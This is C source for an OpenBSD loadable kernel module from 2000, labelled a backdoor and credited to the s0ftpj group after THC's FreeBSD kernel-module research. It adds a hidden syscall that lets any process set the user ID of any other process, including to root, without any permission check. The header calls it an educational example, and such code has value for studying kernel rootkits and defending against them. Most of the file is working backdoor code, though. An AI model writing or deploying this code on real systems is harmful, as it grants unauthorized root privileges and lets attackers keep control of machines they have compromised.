/*
 * Name: OpenBSD backdoor
 * Date: Thu Jun 01 14:46:37 2000
 * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
 *
 * idea & credits go to pragmatic / THC 
 * 				 "Attacking FreeBSD with Kernel Modules"
 *
 * OpenBSD porting by	pIGpEN / s0ftpj
 *
 *
 * SoftProject Digital Security for Y2K (www.s0ftpj.org)
 * Sikurezza.org Italian Security MailingList (www.sikurezza.org)
 *
 * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
 * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
 *
 * Tested on: OpenBSD 2.6 FRACTAL#1 i386
 * 
 * This is a simple but useful backdoor for OpenBSD based on a FreeBSD lkm
 * by pragmatic/THC you can read his paper: "Attacking FreeBSD with Kernel
 * Modules" to understand how to implement it also on a OpenBSD kernel...     
 *
 * Greetings to: bozo(iKX), koba (sikurezza.org), pragmatic (THC) for his
 * 		 work
 *
 * Consider this an example of lkm... don't use it!
 * I didn't cover the module because it must be considered only for 
 * educational purposes 
 */


#include <sys/param.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/conf.h>
#include <sys/syscallargs.h>
#include <sys/exec.h>
#include <sys/lkm.h>
#include <sys/file.h>
#include <sys/filedesc.h>
#include <sys/errno.h>
#include <sys/proc.h>

#define OFFSET	210

struct you_make_me_real_args {
	syscallarg(int) p_pid;	/* process to make with p_real uid */
	syscallarg(int) p_real;	/* p_real uid */
};
			   			  
static int
you_make_me_real (struct proc *p, void *v, register_t *retval) 
{	
	struct you_make_me_real_args *uap = v;
	struct proc *pr;

	if((pr = pfind(SCARG(uap, p_pid))) == NULL)
		return (ESRCH);
	
	pr->p_cred->pc_ucred->cr_uid = SCARG(uap, p_real);
	
	return 0;
}

static struct sysent you_make_me_real_sysent = {
	2,
	sizeof(struct you_make_me_real_args),
	you_make_me_real
};

MOD_SYSCALL( "thc_bck", OFFSET, &you_make_me_real_sysent);

int
thc_bck (struct lkm_table *lkmtp, int cmd, int ver)
{
	DISPATCH(lkmtp, cmd, ver, lkm_nofunc, lkm_nofunc, lkm_nofunc)
}
